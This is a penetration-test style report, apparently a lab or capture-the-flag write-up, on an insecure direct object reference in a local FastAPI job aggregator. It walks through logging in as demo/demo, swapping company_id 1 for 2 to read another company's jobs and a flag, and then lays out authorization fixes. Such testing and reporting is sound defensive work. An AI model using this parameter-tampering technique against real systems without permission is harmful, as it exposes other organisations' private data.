# Security Assessment Report: Job Aggregator IDOR Vulnerability

## TL;DR
- Objective: Exploit an Insecure Direct Object Reference (IDOR) vulnerability when fetching job listings for different companies
- Outcome: **ACHIEVED** - Successfully accessed unauthorized company job data and captured flag
- Highest-impact finding: Complete horizontal privilege escalation via unprotected `company_id` path parameter allows any authenticated user to view any company's job listings
- Validation status: **CONFIRMED EXPLOITATION** - FLAG retrieved from unauthorized company data access

## Target Information
- Target: 127.0.0.1:8000
- Host / base URL: http://127.0.0.1:8000
- Application or component: FastAPI "Ultimate Job Aggregator"
- Authentication context: JWT-based session (via `access_token` cookie)
- Relevant technology details: FastAPI framework, OpenAPI/Swagger documentation available at `/docs` and `/openapi.json`

## Confirmed Vulnerability
### Insecure Direct Object Reference (IDOR) - Horizontal Privilege Escalation
- Affected endpoint / component: `GET /company/{company_id}/jobs`
- Impact: **CRITICAL** - Any authenticated user can access job listings for ANY company by manipulating the `company_id` path parameter, leading to unauthorized data disclosure including sensitive flags/secrets
- Preconditions: 
  - Valid user account (demo/demo credentials work)
  - Successful authentication to obtain JWT session cookie
- Exact payload or PoC: Change `company_id` from user's legitimate company (1) to target company (2): `GET /company/2/jobs`

## Steps to Reproduce
1. Navigate to `http://127.0.0.1:8000/` and authenticate with credentials `username=demo&password=demo`
2. Submit authentication request to `POST /token` with form-urlencoded body:
   ```
   username=demo&password=demo
   ```
3. Capture the JWT `access_token` cookie from the response (format: `Bearer eyJhbGciOiJIUzI1Ni...`)
4. Access your legitimate company jobs at `GET /company/1/jobs` to confirm baseline access
5. Modify the request to access unauthorized company's data: `GET /company/2/jobs`
6. Include the same valid authentication cookie: `Cookie: access_token="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."`
7. Observe that the response returns job listings for Company 2 including the secret flag

## Validation / Evidence
- Validation token / flag: `FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}`
- Tool evidence: OpenAPI schema discovery via `/docs` and `/openapi.json` confirmed the `/{company_id}/jobs` endpoint structure
- Request evidence:
  ```
  POST /token HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  username=demo&password=demo
  ```
  ```
  GET /company/2/jobs HTTP/1.1
  Cookie: access_token="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzc1MDc0OTAyfQ.Cr5NJJPnmKPo1w8U9rV1Ep3E3RYWIDSztBa_HYAglf0"
  ```
- Response evidence:
  ```
  HTTP/1.1 200 OK
  Content-Type: text/html; charset=utf-8
  
  <!DOCTYPE html>
  <html>
  <head>
      <title>Jobs</title>
  </head>
  <body>
      <div class="container">
          <h2>Jobs for Company 2</h2>
          <ul class="list-group">
              <li class="list-group-item">
                  <p>company2 Job 1:company2 Job 1 Description</p>
              </li>
              <li class="list-group-item">
                  <p>company2 Job 2:company2 Job 2 Description</p>
              </li>
              <li class="list-group-item">
                  <p>secret:FLAG{ef9d74447312d7c3d6273f6be7d69abe30b4c8e42bd9ca9002086be3f038d3b0}</p>
              </li>
          </ul>
      </div>
  </body>
  </html>
  ```
- Notes on reliability / limitations: Exploitation is 100% reliable. No rate limiting or additional authorization checks observed. Sequential company IDs (1, 2, 3...) make enumeration trivial.

## Remediation
- Root cause: The application performs **authentication** (verifying the user has a valid JWT session) but fails to perform **authorization** (verifying the authenticated user owns or has permission to access the requested `company_id`). The JWT payload contains only `sub` (username) and `exp` (expiration) with NO company association.
- Recommended fix: 
  1. **Add authorization logic**: Before returning job data, verify the authenticated user belongs to the requested company_id. Map users to their authorized companies in the database/session.
  2. **Enrich JWT claims**: Include `company_id` in the JWT payload during authentication: `{"sub": "demo", "company_id": 1, "exp": <timestamp>}`
  3. **Validate ownership**: In the `/company/{company_id}/jobs` handler, compare `token.company_id` against the requested `company_id` parameter:
     ```python
     if current_user.company_id != company_id:
         raise HTTPException(status_code=403, detail="Unauthorized access to company data")
     ```
- Defense-in-depth:
  - Use UUIDs or non-sequential identifiers for company IDs to prevent enumeration
  - Implement middleware-level authorization checks
  - Add comprehensive audit logging for cross-company access attempts
  - Consider row-level security (RLS) in database queries

## How to Verify the Fix
1. Authenticate as user "demo" (company 1) and obtain JWT cookie
2. Attempt to access `GET /company/2/jobs` with valid authentication
3. **Expected secure result**: HTTP 403 Forbidden response with message like "Unauthorized access to company data" or "You do not have permission to view this company's jobs"
4. Verify that accessing `GET /company/1/jobs` (user's own company) still returns data successfully
5. Confirm the JWT payload now includes company association that is validated server-side

## Remaining Leads
- Confirmed blockers: None - vulnerability fully exploited
- Unverified leads: None - all goals achieved
- Missing context: None - complete authentication flow and exploitation chain documented

---

**Report Generated**: Security Assessment Reporter  
**Confidence Level**: 1.00 (Fully validated with flag capture)  
**Retest Recommended**: After authorization controls are implemented
